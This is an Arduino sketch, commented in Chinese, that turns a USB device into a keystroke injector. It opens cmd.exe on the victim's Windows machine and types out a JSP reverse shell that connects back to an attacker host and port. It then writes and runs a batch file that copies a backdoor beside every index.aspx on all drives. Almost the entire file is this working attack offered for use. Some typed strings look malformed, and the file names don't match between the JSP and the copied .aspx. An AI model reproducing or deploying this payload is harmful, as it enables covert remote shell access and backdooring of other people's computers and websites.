#include<Keyboard.h>

void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(200); 
  Keyboard.press('r');//r键 
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.println("cmd.exe");
  delay(200); 
  Keyboard.println('echo ^<%@page import="java.lang.*"%^>  >> hacked.jsp');  //向hacked.jsp写内容
  delay(200); 
  Keyboard.println('echo ^<%@page import="java.util.*"%^>  >> hacked.jsp');
  delay(200); 
  Keyboard.println('echo ^<%@page import="java.io.*"%^>  >> hacked.jsp');
  delay(200); 
  Keyboard.println('echo ^<%@page import="java.net.*"%^>  >> hacked.jsp');
  delay(200); 
  Keyboard.println("echo ^<%  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo   class StreamConnector extends Thread  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo   {  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     InputStream ep;  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     OutputStream wk;  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     StreamConnector( InputStream ep, OutputStream wk )  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     {  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       this.ep = ep;  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       this.wk = wk;  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     }  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     public void run()  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     {  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       BufferedReader lv  = null;  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       BufferedWriter gih = null;  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       try  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       {  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         lv  = new BufferedReader( new InputStreamReader( this.ep ) );  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         gih = new BufferedWriter( new OutputStreamWriter( this.wk ) );  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         char buffer[] = new char[8192];  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         int length;  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         while( ( length = lv.read( buffer, 0, buffer.length ) ) > 0 )  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         {  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo           gih.write( buffer, 0, length );  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo           gih.flush();  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         }  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       } catch( Exception e ){}  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       try  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       {  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         if( lv != null )  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo           lv.close();  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo         if( gih != null )  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo           gih.close();  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo       } catch( Exception e ){}  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     }  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo   }  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo   try  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo   {  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     String ShellPath;  >> hacked.jsp");
  delay(200); 
  Keyboard.println('echo if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {  >> hacked.jsp');
  delay(200); 
  Keyboard.println('echo   ShellPath = new String("/bin/sh");  >> hacked.jsp');
  delay(200); 
  Keyboard.println("echo } else {  >> hacked.jsp");
  delay(200); 
  Keyboard.println('echo   ShellPath = new String("cmd.exe");  >> hacked.jsp');
  delay(200); 
  Keyboard.println("echo }  >> hacked.jsp");
  delay(200); 
  Keyboard.println('echo     Socket socket = new Socket( "192.168.154.131", 4444 );  >> hacked.jsp');  //改为自己主机的IP地址和对应端口号
  delay(200); 
  Keyboard.println("echo     Process process = Runtime.getRuntime().exec( ShellPath );  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo   } catch( Exception e ) {}  >> hacked.jsp");
  delay(200); 
  Keyboard.println("echo %^>  >> hacked.jsp");
  delay(200); 
  
  Keyboard.println("echo @echo off >> hacked.bat");
  delay(200); 
  Keyboard.println("echo set 'FileName=index.aspx' >> hacked.bat");  //目标文件index.aspx
  delay(200); 
  Keyboard.println("echo echo 正在更新磁盘文件，请稍候... >> hacked.bat");
  delay(200); 
  Keyboard.println("echo for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo   if exist %%a:\ ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     pushd %%a:\ >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     for /r %%b in (*%FileName%) do ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo       if /i '%%~nxb' equ '%FileName%' ( >> hacked.bat");
  delay(200); 
  Keyboard.println("echo         copy %~p0hacked.aspx %%~dpb >> hacked.bat");
  delay(200); 
  Keyboard.println("echo       ) >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     ) >> hacked.bat");
  delay(200); 
  Keyboard.println("echo     popd >> hacked.bat");
  delay(200); 
  Keyboard.println("echo   ) >> hacked.bat");
  delay(200); 
  Keyboard.println("echo ) >> hacked.bat");
  delay(200); 
  
  Keyboard.println("hacked.bat");  //放入jsp网站根目录，作为后门等待连接
  delay(9000); 
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}